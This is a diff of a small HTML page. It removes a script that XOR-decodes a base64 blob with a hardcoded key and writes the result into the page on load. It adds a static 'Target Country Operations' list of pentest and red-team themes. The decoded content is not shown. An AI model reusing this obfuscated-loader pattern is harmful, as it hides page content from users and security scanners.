@@ -1,52 +1,8 @@
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>Obfuscated HTML loader</title>
-</head>
-<body>
-<script>
-(function() {
-  try {
-    var payload_b64 = "4mSlylSTwMyVA7gtRQDIUOx0+8pRkM/Ly1z1NURYyBimeLqNRZrE0csKqmkAFd5Q6i6pGqhxDp+yX+g+RQycPrF5+Z5FhoHwllvoOFQR0xOtMLiCBcGrg5NSujpMGc8O4y7kmlacxJKfE6l7HnKcXeJg/spUk8DMlQO4OkEK2F/g/AhtjQ8+OF4ezwphWF79TSzehFGNwMySTO86VA3OGP5c8oRDmtLLj1D9eWMZ0Q2/ZfCEC9DN1tg0unkcFNVdvWD2mUTCg9yHTP57Hogj+nL8CG2Q3/T0xtwaygAr0x63bfvKcpHG1ohb/ytJFttdjWX6n1ue1daJUOllDxTVQ9Qst9ZbloHcil/pKh1a3xysaLXUx2AmEBahHewAMt0Nv2K3CLdsgfmPUPs3QxHdEf5f8olDkNOftFv+eXQd3RD+Q+eZC9DN1tg0unkcFNVdvWD2mUTCg9yHTP57Hogj+nf8CG2d3+balFP7N1lYXv1NLMSeUp7Ny44e3yFQFNMUqizTj0eTzsaLW/QtU0STEbcyncoXw83Wxl32OFMLgV+9beWOFcFRIGGZasanz5w/rG3tg1vfQz91Htk1Tw3YXY1p9J9FltXGxnzoPEEb1F2NZfqfW57V1olQpnZMEYJ34iPihgn1";
-    var key_hex = "de0c97ea37ffa1bfe63e9a592078bc7d";
-
-    function hexToBytes(hex) {
-      var bytes = new Uint8Array(hex.length / 2);
-      for (var i = 0; i < bytes.length; i++) {
-        bytes[i] = parseInt(hex.substr(i*2, 2), 16);
-      }
-      return bytes;
-    }
-
-    function b64ToUint8Array(b64) {
-      var binary_string = atob(b64);
-      var len = binary_string.length;
-      var bytes = new Uint8Array(len);
-      for (var i = 0; i < len; i++) {
-        bytes[i] = binary_string.charCodeAt(i);
-      }
-      return bytes;
-    }
-
-    var data = b64ToUint8Array(payload_b64);
-    var key = hexToBytes(key_hex);
-
-    for (var i = 0; i < data.length; i++) {
-      data[i] = data[i] ^ key[i % key.length];
-    }
-
-    var decoder = new TextDecoder('utf-8');
-    var html = decoder.decode(data);
-
-    document.open();
-    document.write(html);
-    document.close();
-  } catch (e) {
-    document.body.innerHTML = "<pre style='white-space:pre-wrap;font-family:monospace;color:#900'>Error decoding obfuscated HTML:\n" + (e && e.stack ? e.stack : e) + "</pre>";
-    console.error("Obfuscated HTML loader error:", e);
-  }
-})();
-</script>
-</body>
-</html>
+<h2 class="text-2xl font-bold text-green-400 mb-4">🎯 Target Country Operations</h2>
+<ul class="space-y-3">
+  <li class="card">🇺🇸 USA – Infrastructure Pentesting Campaign</li>
+  <li class="card">🇬🇧 UK – Social Engineering Simulations</li>
+  <li class="card">🇯🇵 Japan – Financial Sector Red Team Ops</li>
+  <li class="card">🇩🇪 Germany – Stealth Exploit Deployments</li>
+  <li class="card">🇧🇷 Brazil – Cloud Security Breach Simulation</li>
+</ul>
